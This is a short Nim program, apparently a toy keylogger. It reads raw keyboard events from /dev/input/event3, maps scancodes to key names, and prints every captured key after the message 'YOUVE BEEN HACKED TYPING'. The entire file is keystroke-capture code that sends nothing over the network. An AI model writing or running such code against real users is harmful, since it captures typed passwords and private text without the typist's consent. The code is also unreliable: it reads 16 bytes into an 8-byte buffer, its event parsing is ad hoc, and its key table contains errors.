proc toString(byt: int): string =

    var count = 0
    const letters = ["esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACK_SPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CONTROL", "a", "s", 
                        "d", "f", "g", "h", "j", "k", "l", ";", "'", "UNKOWN", "L_SHIFT", """\""", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", 
                        "UNKNOWN", "L_ALT", "SPACE"]


    for i in letters:
        if byt - 1 == count:
            return letters[count]
        count = count + 1


iterator getKey(): string =
    var data: array[8, int8]
    var longData: seq[int]
    var found = false

    var file = open("/dev/input/event3")
    defer: file.close()
    while true:
        discard readBytes(file, data, 0, 16)
        for d in data:
            if d == 4:
                found = true
            if found == true:
                longData.add(d)
        if longData == @[]:
            discard
        elif longData[4] == 0:
            discard
        else:
            yield toString(longData[4])
        found = false
        longData = @[]

            
        
proc main() =
    for x in getKey():
        if x == "":
            discard
        else:
            echo "YOUVE BEEN HACKED TYPING ", x 


main()
